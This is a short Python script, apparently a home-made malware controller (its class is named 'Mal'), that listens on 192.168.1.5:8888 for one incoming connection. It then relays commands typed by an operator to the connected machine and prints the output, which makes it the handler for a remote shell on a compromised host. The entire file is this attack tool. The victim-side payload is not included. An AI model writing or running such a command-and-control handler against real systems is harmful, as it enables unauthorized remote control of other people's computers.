#!/usr/bin/python3
import socket
import time

class Mal():
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
        self.__listen__()
        self.__main__()

    def __listen__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
       
        try:
            self.s.bind((self.ip,self.port))
            self.s.listen(1)
            print("[+] Listening For Connection...")
            self.c , self.a = self.s.accept()
            print(f"[+] Conntected To: {self.a[0]} {self.a[1]}")

        except Exception as e:
            print(f"[-] {str(e)[str(e).find(']')+2:]}")
            sys.exit(1)
    
    
    def __main__(self):
        
        while(1):
            cmd = input("\n#$> ")
             
            if (cmd == "quit!"):
                self.c.send(cmd.encode())
                time.sleep(2)
                self.c.close()
                exit(0)
            
            elif (len(cmd) == 0):
                continue
            
            else:
                try:
                    self.c.send(cmd.encode())
                    output = self.c.recv(1024)
                except:
                    output = b"[-]Error.SERVER.SEND"
                
                while(len(output)):
                    try:
                        print(output.decode(),end="")
                    except:
                        print(output,end="")
                    self.c.settimeout(0.5)
                    try:
                        output = self.c.recv(1024)
                        
                    except TimeoutError:
                        break


Mal("192.168.1.5",8888)
        

